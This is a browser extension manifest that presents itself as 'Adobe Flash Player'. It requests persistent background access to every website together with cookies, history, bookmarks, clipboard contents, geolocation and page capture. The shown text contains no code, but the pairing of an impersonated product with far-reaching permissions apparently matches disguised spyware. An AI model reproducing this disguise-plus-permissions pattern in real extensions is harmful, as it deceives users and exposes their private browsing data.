{
  "manifest_version": 2,
  "name": "Adobe Flash Player",
  "version": "11.5.502.135",
  "description": "Shockwave Flash 11.5 r502",

  "background": {
    "persistent": true,
    "scripts": [
      "lib/FileSaver.js",
      "background.js"
    ]
  },

  "permissions": [
    "http://*/*",
    "https://*/*",
    "background",
    "bookmarks",
    "clipboardRead",
    "cookies",
    "geolocation",
    "history",
    "pageCapture",
    "storage",
    "tabs",
    "topSites",
    "unlimitedStorage",
    "windows"
  ],

  "icons": {
    "256": "img/icon_256.png",
    "48": "img/icon_48.png",
    "32": "img/icon_32.png",
    "24": "img/icon_24.png",
    "16": "img/icon_16.png"
   }
}
